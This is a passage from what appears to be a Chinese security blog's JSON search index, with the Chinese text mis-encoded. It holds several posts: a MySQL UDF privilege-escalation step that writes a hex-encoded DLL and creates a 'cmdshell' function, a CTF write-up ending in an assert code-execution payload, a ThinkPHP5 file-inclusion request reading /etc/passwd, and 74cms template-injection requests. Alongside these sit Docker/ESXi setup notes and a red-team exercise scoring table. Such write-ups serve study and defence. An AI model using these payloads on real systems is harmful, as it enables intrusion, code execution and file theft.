6f6164657200646f776e6c6f616465725f6465696e697400646f776e6c6f616465725f696e6974006f70656e33333839006f70656e333338395f6465696e6974006f70656e333338395f696e6974007265677265616400726567726561645f6465696e697400726567726561645f696e69740072656777726974650072656777726974655f6465696e69740072656777726974655f696e6974007368757400736875745f6465696e697400736875745f696e697400') into dumpfile 'C:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\moonudf.dll'; åˆ›å»ºå‡½æ•° 1create function cmdshell returns string soname 'C:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\moonudf.dll'","link":"/2021/03/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sql-security-tiquan/"},{"title":"å…³äºVMwareç£ç›˜é•œåƒå¯¼å…¥ESXiçš„æ–¹æ³•","text":"å¤šç£ç›˜æ ¼å¼é¦–å…ˆå°†å¤šä¸ªç£ç›˜è¿›è¡Œåˆå¹¶å¤„ç†ï¼Œä½¿ç”¨vmwareè‡ªå¸¦çš„vmware-vdiskmanager.exeå·¥å…· 1&quot;D:\\InstallSoftware\\VMware\\VMware Workstation\\vmware-vdiskmanager.exe&quot; -r &quot;Windows Server 2008 R2 x64.vmdk&quot; -t 0 ATT01-win2008.vmdk å•ç£ç›˜å•ç£ç›˜æ¯”è¾ƒç®€å•ï¼Œç›´æ¥æ‰¾åˆ°è™šæ‹Ÿæœºvmdkæ–‡ä»¶å³å¯ ESXiæ“ä½œé¦–å…ˆåˆ›å»ºä¸€ä¸ªå¯¹åº”é•œåƒæ ¼å¼çš„è™šæ‹Ÿæœº åˆ›å»ºæˆåŠŸåï¼Œåˆ é™¤è¯¥é•œåƒçš„é»˜è®¤vmdkæ–‡ä»¶ æ‰“å¼€ESXiçš„sshï¼Œä½¿ç”¨sftpå·¥å…·è¿æ¥ä¸Šä¼ é•œåƒæ–‡ä»¶ ä¸Šä¼ è·¯å¾„/vmfs/volumes/datastore1/ ç”±äºvmwareçš„ç£ç›˜é•œåƒæ ¼å¼å’ŒESXiçš„æœ‰æ‰€ä¸åŒï¼Œéœ€è¦ä½¿ç”¨ESXiçš„vmkfstoolså·¥å…·è¿›è¡Œè½¬æ¢ è½¬æ¢ç”Ÿæˆçš„é•œåƒåç§°å’Œåˆšåˆšåˆ›å»ºçš„è™šæ‹Ÿæœºé•œåƒåä¿æŒä¸€è‡´ 1vmkfstools -i ATT01-win2008.vmdk ATT01-win2008R2.vmdk å°†è½¬æ¢åçš„ç£ç›˜ç§»åŠ¨åˆ°å¯¹åº”è™šæ‹Ÿæœºçš„ç›®å½•ä¸‹ ä¹Ÿå¯ä»¥å…ˆåˆ›å»ºè™šæ‹Ÿæœºï¼Œå†ä¸Šä¼ ç£ç›˜åˆ°è™šæ‹Ÿæœºç›®å½•ä¸‹ï¼Œå†å¯¹å…¶è¿›è¡Œè½¬æ¢å³å¯ã€‚","link":"/2021/12/27/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"ubuntuå®‰è£…docker","text":"ubuntuä¸‹å¿«é€Ÿå®‰è£…dockerçš„æ­¥éª¤ ubuntuå®‰è£…dockerå®‰è£…curl apt-get curl HTTPSå­˜å‚¨åº“ apt-get install apt-transport-https ca-certificates curl software-properties-common æ·»åŠ dockerä¸­ç§‘å¤§æºGPGå¯†é’¥ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add - è®¾å®šç¨³å®šå­˜å‚¨åº“ sudo add-apt-repository â€œdeb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu $(lsb_release -cs) stableâ€ æ›´æ–°aptèµ„æºåŒ…ï¼Œè¿›è¡Œdocker ceå®‰è£… apt-get update apt-get -y install docker-ce","link":"/2018/06/17/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ubuntu-install-docker/"},{"title":"è®°2021å…¨å›½hvvæ¼”ç»ƒçš„ç‚¹ç‚¹æ»´æ»´","text":"ä¸€ã€å‰è¨€2021å¹´çš„å…¨å›½hvvæ¼”ç»ƒæ¯”ä»¥å¾€æ¥çš„ç¨å¾®æ—©äº†ä¸€äº›ï¼Œç”±äºç½‘ç»œå®‰å…¨åœ¨å›½å®¶æˆ˜ç•¥å±‚é¢çš„æ˜¾è‘—æå‡ï¼Œå„ç±»ç½‘å®‰è¡ŒåŠ¨å¦‚ç«å¦‚è¼ï¼Œä¸€è‚¡å¼ºçƒˆçš„ç½‘å®‰ä¹‹é£å¹éäº†æ•´ä¸ªä¸­åå¤§åœ°ã€‚å…¨å›½æ¼”ç»ƒæ´»åŠ¨å·²ç»å¼€å±•äº†å‡ æ¬¡ï¼Œç›¸æ¯”äºå¾€å¹´æ¥è¯´ï¼Œæ•´ä¸ªç½‘ç»œå®‰å…¨ç¯å¢ƒå¸¦æ¥äº†æ˜¾è‘—æå‡å’Œä¼˜åŒ–ï¼Œè¿™å°±æ„å‘³ç€æ¼”ç»ƒç›®æ ‡å˜çš„è¶Šæ¥è¶Šéš¾æ‰“ã€‚ æœ¬äººæœ‰å¹¸ä»£è¡¨å…¬å®‰å…å‚ä¸äº†æ­¤æ¬¡2021å¹´å…¨å›½æ”»é˜²æ¼”ç»ƒçš„æ´»åŠ¨ï¼Œæ­¤æ¬¡æ´»åŠ¨å†ç»18å¤©å·¦å³ï¼Œåœ¨å…¬å®‰éƒ¨çš„ä¸¥å¯†éƒ¨ç½²ä¸‹ç´§å¼ æœ‰åºçš„è¿›è¡Œç€ã€‚æœ¬äººä¹Ÿæ˜¯é¦–æ¬¡å‚åŠ æ­¤ç±»è§„æ¨¡çš„æ”»é˜²æ¼”ç»ƒæ´»åŠ¨ï¼Œæ•´ä¸ªå‚æ¼”å›¢é˜Ÿä¹Ÿéƒ½ç¬¬ä¸€æ¬¡ã€‚å¤§å®¶çš„ç»éªŒéƒ½ä¸æ˜¯å¤ªä¸°å¯Œï¼Œå…¶æ¬¡å¤§å®¶ä¹Ÿéƒ½æ˜¯æŠ±ç€ä½“éªŒï¼Œäº¤æµï¼Œæˆé•¿çš„ç›®çš„æ¥å‚ä¸æ­¤æ¬¡çš„æ”»é˜²æ¼”ç»ƒæ´»åŠ¨çš„ã€‚ä½†æ˜¯åœ¨æœ€ç»ˆæˆç»©è¿™ä¸€å—è¿˜æ˜¯æ¯”è¾ƒæ»¡æ„ã€‚æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒç´§å¼ åˆºæ¿€ä¸”å¯Œæœ‰æŒ‘æˆ˜æ€§çš„ï¼Œè¿™é‡Œæƒ³ç€èŠ±ç‚¹æ—¶é—´è¯¦ç»†æ•´ç†ä¸€ä¸‹æ­¤æ¬¡æ”»é˜²è¿‡ç¨‹ä¸­çš„å…¸å‹ç»†èŠ‚ä»¥åŠç›¸å…³æ„Ÿæ‚Ÿï¼Œè¿™è¾¹ä¸»è¦åå‘äºä¸€äº›æ€è·¯çš„å±•å¼€è®²è§£ï¼Œä¸è¿‡å¤šçº ç»“äºæŠ€æœ¯ç»†èŠ‚ã€‚å¯¹äºè®¸å¤šçš„å¤§ä½¬æ¥è¯´ï¼ŒæŠ€æœ¯å…¶å®éƒ½æ˜¯å¸¸è§æŠ€æœ¯ç‚¹ï¼Œå¹¶æ²¡æœ‰å¤ªå¤šçš„èŠ±å¤´ã€‚è€Œä¸”å°±æˆ‘æ­¤æ¬¡çš„æ¼”ç»ƒæ„Ÿæ‚Ÿæ¥çœ‹ï¼Œæ€è·¯æ˜¯å†³å®šæœ€ç»ˆæˆç»©å¥½åçš„æœ€å…³é”®å› ç´ ã€‚å°±æƒ³æœ€ç»ˆçš„APTæ”»å‡»ä¸€æ ·ï¼Œæœ€å¤§ç¨‹åº¦ä¸Šåˆ©ç”¨çš„äººæ€§æœ¬èº«çš„å¼±ç‚¹ã€‚åœ¨æ­¤æ¬¡çš„æ”»é˜²æ¼”ç»ƒä¸­ï¼Œä¹Ÿæ˜¯å¦‚æ­¤ã€‚è¿™è¾¹æœ¬äººå·²å°†ç›¸åº”çš„æ•æ„Ÿä¿¡æ¯è¿›è¡Œè„±æ•å¤„ç†ï¼Œå¹¶ä¸”ä¸è¿›è¡Œå¹¿æ³›ä¼ æ’­ã€‚ äºŒã€è¿‡ç¨‹1 è¯„åˆ†æœºåˆ¶å›½å®¶çº§æ”»é˜²æ¼”ç»ƒå’Œçœåœ°å¸‚æ¼”ç»ƒæœ‰æ‰€ä¸åŒï¼Œä¸»è¦æ”¶å½•å’Œå‚ä¸è¯„åˆ†çš„æ¼æ´ä¸»è¦ä¸ºç³»ç»Ÿçº§æƒé™æ¼æ´ï¼Œå¯¹äºä¸€èˆ¬æ€§ä¸å¯åˆ©ç”¨çš„ä½å±æ¼æ´å¹¶ä¸å‚ä¸è®¡åˆ†å¤„ç†ã€‚å¹¶ä¸”å¯å¯¹å†…ç½‘èµ„äº§è¿›è¡Œæ¸—é€ã€‚æ¶‰åŠçš„ç›¸å…³è¯„åˆ†æœºåˆ¶ä¸»è¦å¦‚ä¸‹: ç±»å‹ è¯„åˆ† å¤‡æ³¨ å‚æ¼”å•ä½åŸŸåæ§åˆ¶æƒé™ ä¸€çº§100ã€äºŒçº§50 å•ä¸ªå‚æ¼”å•ä½å¾—åˆ†ä¸Šé™500 è·å–pcã€ç§»åŠ¨ç«¯æƒé™ pcï¼š20/å°ã€ç§»åŠ¨ç«¯ï¼š50/å° å¾—åˆ†ä¸Šçº¿500ã€ä¸”pcæƒé™å¿…é¡»ä¸ºsystemã€root è·å–é‚®ç®±æƒé™ é‚®ç®±è´¦å·å£ä»¤ï¼š20ã€ç³»ç»Ÿç®¡ç†å‘˜æƒé™ï¼š500-1000 åŠå…¬è‡ªåŠ¨åŒ–ç³»ç»Ÿæƒé™ 200-500 OAã€å³æ—¶é€šè®¯ã€é¡¹ç›®ç®¡ç†ã€è´¢åŠ¡ç³»ç»Ÿç®¡ç†å‘˜æƒé™ èº«ä»½ã€è´¦æˆ·ç®¡ç†å¹³å°æƒé™ï¼ˆSSOã€4Aï¼‰ ç³»ç»Ÿç®¡ç†æƒé™300ã€èƒ½ç™»é™†çš„ç³»ç»Ÿ100 åŸŸæ§ç³»ç»Ÿæƒé™ ç®¡ç†å‘˜200ã€åŸŸå†…å¯æ§æœåŠ¡å™¨10/å° ä¸Šé™4000 å ¡å’æœºã€è¿ç»´æœºæƒé™ ç®¡ç†å‘˜200ã€æ‰˜ç®¡çš„æœåŠ¡å™¨10/å° ä¸Šé™4000 è·å–å¤§æ•°æ®ç³»ç»Ÿæƒé™ æ ¹æ®æ•°æ®é‡å’Œé‡è¦ç¨‹åº¦ç»™åˆ†ï¼Œä¸Šé™3000 è·å–æ•°æ®åº“è¿æ¥è´¦å·å¯†ç  æ™®é€š50ã€ç®¡ç†å‘˜100 ä¸Šé™1000 è·å–ç½‘ç»œè®¾å¤‡æƒé™ ç½‘ç»œç­‰çº§ç»™åˆ†ï¼Œå¤§å‹300 éœ€æä¾›è·¯ç”±è¡¨åŠè¿æ¥é‡ä¸Šé™2000 è·å–å·¥ä¸šäº’è”ç½‘ç³»ç»Ÿæƒé™ æŒ‡æŒ¥éƒ¨ç ”åˆ¤ç»™åˆ† ç‰©è”ç½‘è®¾å¤‡ç®¡æ§å¹³å°æƒé™ æ§åˆ¶åŠŸèƒ½çš„å¹³å°200ã€è¿æ¥æ•°5/å° ä¸Šé™1000 å®‰å…¨è®¾å¤‡æƒé™ æ™®é€š50ã€ç®¡ç†å‘˜200 idsã€å®¡è®¡ã€wafä¸Šé™1000 ä¸€èˆ¬webåº”ç”¨ã€ftpæƒé™ æ™®é€š20ã€ç®¡ç†å‘˜100 è·å–æœåŠ¡å™¨ä¸»æƒé™ æ™®é€š50ã€ç®¡ç†å‘˜100 çªç ´ç½‘ç»œè¾¹ç•Œ ä¸Šé™8000 è¿›å…¥é€»è¾‘éš”ç¦»ä¸šåŠ¡å†…ç½‘ 1000 éœ€æä¾›é˜²ç«å¢™vpnç½‘ç»œè®¾å¤‡æ§åˆ¶æˆªå›¾ æ ¸å¿ƒç”Ÿäº§ç½‘ 10000 é“è·¯è°ƒåº¦ã€é“¶è¡Œæ ¸å¿ƒã€ç”µåŠ›ç”Ÿäº§ç­‰ å‘ç°å·²æ¤å…¥webshellæœ¨é©¬ã€ä¸»æœºæœ¨é©¬ 100-500 å‘ç°é»‘å®¢ç ´è§£ç™»å½•ä¸»æœºç³»ç»Ÿ 100-500 å‘ç°ä¸»æœºå¼‚å¸¸æ–°å¢è´¦å· 100-500 å‘ç°éšè”½æ§åˆ¶é€šé“ 100-500 æäº¤0dayæˆ–æœªè¢«æ­£å¼å…¬å¼€N-day 0-10000 2 æŠ¥å‘Šå®¡æ ¸æäº¤æŠ¥å‘Šæ—¶ï¼Œæœ‰ä¸“é—¨çš„è™šæ‹ŸåŒ–è½¯ä»¶å¹³å°ï¼Œåœ¨æ­¤å¹³å°å†…è¿›è¡ŒæŠ¥å‘Šæäº¤ã€‚æäº¤æŠ¥å‘Šä¸ä»…è¦åŒ…å«å®Œæ•´çš„æ”»å‡»æ–‡æ¡£ï¼Œä¸”é¡»å¯¹æ•´ä¸ªå®Œæ•´çš„æ”»å‡»åˆ©ç”¨é“¾è¿›è¡Œæ¢³ç†ï¼Œå½¢æˆå®Œæ•´çš„æ”»å‡»æµç¨‹å›¾ï¼Œä¸”å¯¹è·å–çš„å¯¹åº”èµ„äº§æ•°é‡åŠæƒé™è¿›è¡Œé€ä¸€å¡«å†™ã€‚åæ­£æ•´ä¸ªæŠ¥å‘Šçš„æäº¤æµç¨‹è¾ƒä¸ºå¤æ‚ã€‚ 3 èµ„äº§é¶æ ‡æä¾›çš„èµ„äº§é¶æ ‡ä¸»è¦ä¸ºå†…ç½‘èµ„äº§ï¼Œä¸”æˆ‘ä»¬è·å–çš„èµ„äº§ç³»ç»Ÿä¸»è¦ä¸ºå›½å®¶çº§æ”¿åºœé—¨æˆ·ç½‘ç«™åŠå…¶å†…ç½‘æ ¸å¿ƒç³»ç»Ÿã€‚ é¶æ ‡ä¸ä¼šæä¾›å…·ä½“çš„ipåœ°å€ä»¥åŠå¯¹åº”çš„urlï¼Œéœ€è¦åœ¨äº’è”ç½‘æ”¶é›†å¯¹åº”é¶æ ‡çš„ç³»ç»Ÿå…¥å£åŠå¯èƒ½äº’è”çš„ç³»ç»Ÿç¯å¢ƒåŠå…¶ç½‘ç«™ã€‚è¿™æ ·å°±ä¼š","link":"/2021/04/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/hvv/2021-hvv-country/"},{"title":"Baby PHP(hacklu CTF 2018)","text":"è®°å½•ä¸€é“å…¸å‹CTFæºç å®¡è®¡é¢˜çš„è§£é¢˜è¿‡ç¨‹ Baby PHP(hacklu CTF 2018)é¢˜ç›®æºç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?phprequire_once('flag.php');error_reporting(0);if(!isset($_GET['msg'])){ highlight_file(__FILE__); die();}@$msg = $_GET['msg'];if(@file_get_contents($msg)!==&quot;Hello Challenge!&quot;){ die('Wow so rude!!!!1');}echo &quot;Hello Hacker! Have a look around.\\n&quot;;@$k1=$_GET['key1'];@$k2=$_GET['key2'];$cc = 1337;$bb = 42;if(intval($k1) !== $cc || $k1 === $cc){ die(&quot;lol no\\n&quot;);}if(strlen($k2) == $bb){ if(preg_match('/^\\d+ï¼„/', $k2) &amp;&amp; !is_numeric($k2)){ if($k2 == $cc){ @$cc = $_GET['cc']; } }} list($k1,$k2) = [$k2, $k1];if(substr($cc, $bb) === sha1($cc)){ foreach ($_GET as $lel =&gt; $hack){ $$lel = $hack; }}$â€®b = &quot;2&quot;;$a=&quot;â€®b&quot;;//;1=bif($$a !== $k1){ die(&quot;lel no\\n&quot;);}// plz die nowassert_options(ASSERT_BAIL, 1);assert(&quot;$bb == $cc&quot;);echo &quot;Good Job ;)&quot;;// TODO// echo $flag; ä»£ç åˆ†æpart 1 1234@$msg = $_GET['msg'];if(@file_get_contents($msg)!==&quot;Hello Challenge!&quot;){ die('Wow so rude!!!!1');} 1ã€é€šè¿‡getè·å–å˜é‡$msgå†…å®¹ï¼Œç»è¿‡ä¸€ä¸ªåˆ¤æ–­å¸¦å…¥åˆ°å‡½æ•°file_get_contents()ä¸­ï¼Œä½¿å¾—ç»“æœä¸ºâ€Hello Challenge!â€ã€‚è¿™é‡Œæœ‰ä¸¤ç§ç»•è¿‡æ–¹å¼ï¼š msg=data://plain/text,Hello Challenge! msg=php://input post:Hello Challenge! part 2 12345678@$k1=$_GET['key1'];@$k2=$_GET['key2'];$cc = 1337;$bb = 42;if(intval($k1) !== $cc || $k1 === $cc){ die(&quot;lol no\\n&quot;);} 2ã€é€šè¿‡getè·å–å˜é‡$k1,$k2ã€‚åˆ¤æ–­å˜é‡$k1çš„æ•´æ•°å€¼ä¸$ccä¸ç›¸ç­‰ï¼›å¹¶ä¸”$k1è¦æ’ç­‰äº$ccï¼ˆæ’ç­‰äºå°±æ˜¯å˜é‡ç±»å‹ä¹Ÿè¦ä¸€è‡´ï¼‰ã€‚è¿™è¾¹æˆ‘ä»¬å¯ä»¥çŸ¥é“$k1æ˜¯é€šè¿‡key1è·å–å¾—åˆ°ï¼Œæ‰€ä»¥k1æ°¸è¿œæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥$k1===$ccæ°¸è¿œä¸ºfalse;æ‰€ä»¥åªèƒ½ä½¿$k1=1337; part 3 1234567if(strlen($k2) == $bb){ if(preg_match('/^\\d+ï¼„/', $k2) &amp;&amp; !is_numeric($k2)){ if($k2 == $cc){ @$cc = $_GET['cc']; } }} 3ã€åˆ¤æ–­å˜é‡k2çš„é•¿åº¦æ˜¯å¦ç­‰äº$bb,ä¹Ÿå°±æ˜¯42ä½;ç¬¬äºŒä¸ªifé€šè¿‡æ­£åˆ™åˆ¤æ–­å˜é‡$k2æ˜¯å¦ä¸ºçº¯æ•°å­—åŠ ä¸Šï¼„ç»“å°¾ï¼Œæ­¤å¤„çš„ç¬¦å·å’Œæˆ‘ä»¬å¹³æ—¶è§è¿‡çš„$ç¬¦å·ä¸ä¸€æ ·ï¼Œè¿™ä¸ªæ˜¯unicodeç¼–ç çš„$ç¬¦å·ï¼›æ¡ä»¶!is_numeric($k2)é»˜è®¤æ˜¯æ’æˆç«‹çš„ï¼›è¦ä½¿ç¬¬ä¸‰ä¸ªifæˆç«‹,åˆ™å¯ä»¥ä½¿k2ä¸­å«æœ‰æ•°å­—1337ï¼›ä¸ºäº†æ»¡è¶³é•¿åº¦ä¸º42ä½æˆ‘ä»¬å¯ä»¥ä½¿ç”¨0è¿›è¡Œå¡«å……å ä½;ç‰¹æ®Šå­—ç¬¦ï¼„å¯ä»¥å¯¹å…¶è¿›è¡Œurlç¼–ç å¾—åˆ°%EF%BC%84ï¼Œè¯¥å­—ç¬¦å ä¸‰ä½é•¿åº¦;åˆ™æœ€ç»ˆk2=000000000000000000000000000000000001337%EF%BC%84 part 4 1234567list($k1,$k2) = [$k2, $k1];if(substr($cc, $bb) === sha1($cc)){ foreach ($_GET as $lel =&gt; $hack){ $$lel = $hack; }} 4ã€é¦–å…ˆå¯¹å˜é‡k1ï¼Œk2è¿›è¡Œåˆ—è¡¨ä½ç½®è°ƒæ¢ï¼›å˜é‡$ccé‡æ–°é€šè¿‡getæ–¹å¼è·å–ï¼›ä¼ é€’æ•°ç»„è¿›å…¥å‡½æ•°substr()å’Œsha1()ä¸­ï¼Œä¸¤å‡½æ•°è¿”å›çš„ç»“æœéƒ½ä¸ºnullï¼Œä½¿å¾—æ¡ä»¶æˆç«‹ã€‚ part 5 12345$â€®b = &quot;2&quot;;$a=&quot;â€®b&quot;;//;1=bif($$a !== $k1){ die(&quot;lel no\\n&quot;);} 5ã€æˆ‘ä»¬çœ‹ç¬¬ä¸€è¡Œä»£ç æœ‰äº›ç‰¹æ®Šï¼Œè¿™è¡Œä»£ç å› ä¸ºåœ¨å­—ç¬¦ä¸²å‰æ’å…¥äº†\\u202eï¼Œé‚£ä¹ˆåç»­çš„å­—ç¬¦å°±ä¼šåè½¬ã€‚æ”¾å…¥ç¼–è¾‘å™¨åï¼Œå°±å¯ä»¥çœ‹å‡ºæ­£ç¡®çš„ä»£ç æ ¼å¼ä¸º$b=&quot;2&quot;;$a=&quot;b&quot;;//1=bã€‚åˆ¤æ–­ä¸­$$a == $($a) == $b == 2 ;è¿™é‡Œåªè¦ä½¿å¾—$k1=2å³å¯ã€‚å›åˆ°part4åˆ¤æ–­æˆç«‹çš„å¾ªç¯ä¸­ï¼Œforeaché€šè¿‡getè·å–å‚æ•°çš„è¦†ç›–æ‰å…¨å±€å˜é‡ï¼Œé‚£è¿™ä¸ªå¾ˆå¥½åŠäº†ï¼Œç›´æ¥ä¼ å…¥k1=2å³å¯passã€‚ part 6 12assert_options(ASSERT_BAIL, 1);assert(&quot;$bb == $cc&quot;); 6ã€assertå¯ä»¥è°ƒç”¨å‡½æ•°ï¼Œå¹¶ä¸”å‰é¢æˆ‘ä»¬çŸ¥é“foreachå¯ä»¥å…¨å±€å˜é‡è¦†ç›–ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ„é€ å‡ºassert(var_dump($flag);)å³å¯ï¼›é‡Œé¢$bb=$cc,é‚£ä¹ˆä¼ å…¥cc=var_dump($flag);//å³å¯å®Œæˆ æ¼æ´åˆ©ç”¨payload:192.168.1.191:32768/?msg=data://plain/text,Hello Challenge!&amp;key1=1337&amp;key2=000000000000000000000000000000000001337%EF%BC%84&amp;cc[]=&amp;k1=2&amp;bb=var_dump($flag);//","link":"/2018/12/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/ctf-babyctf-hacklu2018/"},{"title":"thinkphp5æ–‡ä»¶åŒ…å«æ¼æ´åˆ†æ","text":"thinkphp5æ–‡ä»¶åŒ…å«æ¼æ´çš„æºç å®¡è®¡ä¸åˆ†æ æ–‡ä»¶åŒ…å«æ¼æ´ç¯å¢ƒå¤ç°ç›´æ¥å®˜ç½‘ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„æºç åŒ…ï¼Œä½¿ç”¨dockeréƒ¨ç½²å³å¯ã€‚ ä½¿ç”¨å·²æœ‰å¼€æºç¯å¢ƒå¤ç°ï¼š ï¼ˆ1ï¼‰æ‰§è¡Œå‘½ä»¤ docker pull p0ison/thinkphp:5.0.18 ï¼ˆ2ï¼‰æ‰§è¡Œå‘½ä»¤ docker run -itd -p 80:80 p0ison/thinkphp:5.0.18 ï¼ˆ3ï¼‰è®¿é—®åœ°å€ ï¼šhttp://xx.xx.xx.xx/tp/public ç‰ˆæœ¬å½±å“: 5.0.0&lt;=ThinkPHP5&lt;=5.0.18 ã€5.1.0&lt;=ThinkPHP&lt;=5.1.10 æ¼æ´åˆ©ç”¨å¯åŠ¨ç¯å¢ƒï¼Œè¯·æ±‚http://x.x.x.x/public/ tp5è‡ªå¸¦çš„å…¬å…±æ¨¡å— ä¿®æ”¹application/index/controller/Index.phpå†…å®¹å¦‚ä¸‹: 123456789101112&lt;?phpnamespace app\\index\\controller;use \\think\\Controller;class Index extends Controller{ public function index() { $this-&gt;assign($this-&gt;request-&gt;get()); echo &quot;this is test tp5 readfile vul&quot;; return $this-&gt;fetch(&quot;index&quot;); //å½“å‰çš„æ¨¡å—/viewç›®å½•/å½“å‰æ§åˆ¶å™¨/å½“å‰æ“ä½œ è¿™é‡Œæˆ‘å®šä¹‰äº†ä¸€ä¸ªindexæ¨¡å— }} åœ¨application/index/ç›®å½•ä¸‹æ–°å¢viewæ–‡ä»¶å¤¹; åœ¨viewæ–‡ä»¶å¤¹ä¸‹æ–°å¢ä¸æ¨¡å—ååŒåçš„æ–‡ä»¶å¤¹index; åœ¨indexæ–‡ä»¶å¤¹ä¸‹æ–°å»ºæ–‡ä»¶index.html,å†…å®¹éšæ„å³å¯; æœ€åè¯·æ±‚http://x.x.x.x/public/index.php/index/index/index?cacheFile=/etc/passwdï¼ŒæˆåŠŸè¯»å–æ–‡ä»¶ æ¼æ´åˆ†æé¦–å…ˆæˆ‘ä»¬æ–°å»ºçš„ç±»æ–¹æ³•ä¸­è°ƒç”¨æ¨¡æ¿æ¸²æŸ“å‡½æ•°çš„assign,è·Ÿè¿›å‡½æ•°assginçš„æºç ï¼Œç›´æ¥è¿›å…¥\\thinkphp\\library\\think\\Controller.php å‘ç°è°ƒç”¨viewç±»ä¸­çš„assginæ–¹æ³•ï¼Œè·Ÿè¿›ä»£ç ï¼Œè¿›å…¥\\thinkphp\\library\\think\\view.php åˆ†ææºç å‘ç°è¿™é‡Œå¯¹æ¨¡æ¿å˜é‡å€¼è¿›è¡Œäº†èµ‹å€¼ï¼Œå¹¶ä¸”å­˜å…¥åˆ°äº†æ•°ç»„ä¸­ï¼› è¿™é‡ŒåŸºæœ¬æ²¡ä»€ä¹ˆé—®é¢˜ã€‚èµ‹å€¼å®Œæˆåï¼Œä¼šå»è°ƒç”¨fetchæ–¹æ³•åŠ è½½æ¨¡æ¿è¾“å‡ºï¼Œè¿™é‡Œå¦‚æœæ²¡æœ‰æŒ‡å®šæ¨¡æ¿åç§°ï¼Œå°±ä¼šä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶ä½œä¸ºæ¨¡æ¿å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.htmlè¿›è¡Œæ¸²æŸ“ï¼Œå¦‚æœæ²¡æœ‰é»˜è®¤æ–‡ä»¶ç¨‹åºå°±å›æŠ¥é”™ã€‚ç»§ç»­è·Ÿè¿›fetchæ–¹å¼ï¼Œè¿›å…¥\\thinkphp\\library\\think\\Controller.php å‘ç°ç›´æ¥è°ƒç”¨viewç±»ä¸­fetchï¼Œç›´æ¥è·Ÿè¿›ä»£ç ï¼Œè¿›å…¥\\thinkphp\\library\\think\\view.php ç»§ç»­è·Ÿè¿›ä»£ç å†…å®¹è¿›å…¥\\think\\view\\driver\\Think.php å‘ç°ä»£ç ç»§ç»­è°ƒç”¨templateç±»çš„fetchæ–¹æ³•ï¼Œè·Ÿè¿›ä»£ç  æˆ‘ä»¬å‘ç°åœ¨è¿™é‡Œå˜é‡$varsç›´æ¥èµ‹å€¼ç»™$this-&gt;data,å¹¶ä¸”ç›´æ¥è¢«å¸¦å…¥åˆ°templateç±»ä¸­æ–‡ä»¶å¼•æ“è°ƒç”¨readæ–¹æ³•ï¼Œè·Ÿè¿›readæ–¹æ³•ï¼Œ\\think\\template\\driver\\File.php å§æ§½ï¼Œè¿™é‡Œçš„readæ–¹æ³•ç«Ÿç„¶å¯¹$varsè°ƒç”¨äº†extractçš„å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è¦†ç›–cacheFileå˜é‡äº†ï¼Œå› ä¸ºè¿™é‡Œçš„$varså˜é‡æ˜¯å¯ä»¥ç”¨æˆ·æ§åˆ¶çš„ï¼›æœ€ç»ˆè¾¾æˆäº†åˆ©ç”¨ã€‚ æ•´ä½“åˆ©ç”¨é“¾","link":"/2019/03/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-audit-thinkphp5-readfile/"},{"title":"74cmæ¨¡æ¿æ³¨å…¥ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ","text":"74cmsssti æ–‡ä»¶åŒ…å«æ¼æ´çš„æºç å®¡è®¡åˆ†ææµç¨‹ 74cmsssti+æ–‡ä»¶åŒ…å«æ¼æ´ç¯å¢ƒå¤ç°ç›´æ¥å®˜ç½‘ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„æºç åŒ…ï¼Œä½¿ç”¨dockeréƒ¨ç½²å³å¯ã€‚ docker run â€“name 74cms -itd -P 74cmsssti_readfile:latest ç‰ˆæœ¬å½±å“ï¼š74cms &lt; 6.0.48 æ¼æ´åˆ©ç”¨å¯åŠ¨dockerï¼Œè¿›è¡Œç«™ç‚¹å®‰è£…ï¼Œæ•°æ®åº“ï¼šctf ctf ï¼› åå°admin adminï¼› å®‰è£…å®Œæˆåè¯·æ±‚ï¼Œå‘é€å¦‚ä¸‹è¯·æ±‚ï¼š http://x.x.x.x/index.php?m=home&amp;a=assign_resume_tpl POST:variable=1&amp;tpl=/r/n&lt;qscms/company_show åˆ—è¡¨å=â€infoâ€ ä¼ä¸šid=â€$_GET[;id;]â€/&gt; è§¦å‘æŠ¥é”™ï¼Œè¿›å…¥å®¹å™¨å‘ç°æ—¥å¿—è®°å½•åŠŸèƒ½å·²ç»è®°å½•æŠ¥é”™æ—¥å¿—ï¼Œä½ç½®åœ¨:/data/Runtime/Logs/Home æˆ‘ä»¬çœ‹åˆ°æ„é€ çš„payloadå†…å®¹ä¹Ÿè¢«æˆåŠŸå†™å…¥è¿›æ—¥å¿—ï¼Œå¹¶ä¸”æ—¥å¿—çš„å‘½ä»¤æ ¼å¼ä¸º:å¹´_æœˆ_æ—¥.log å°è¯•åŒ…å«æ—¥å¿—,æˆåŠŸåˆ©ç”¨ http://x.x.x.x/index.php?m=home&amp;a=assign_resume_tpl POST:variable=1&amp;tpl=data/Runtime/Logs/Home/21_01_06.log æ¼æ´åˆ†ææ 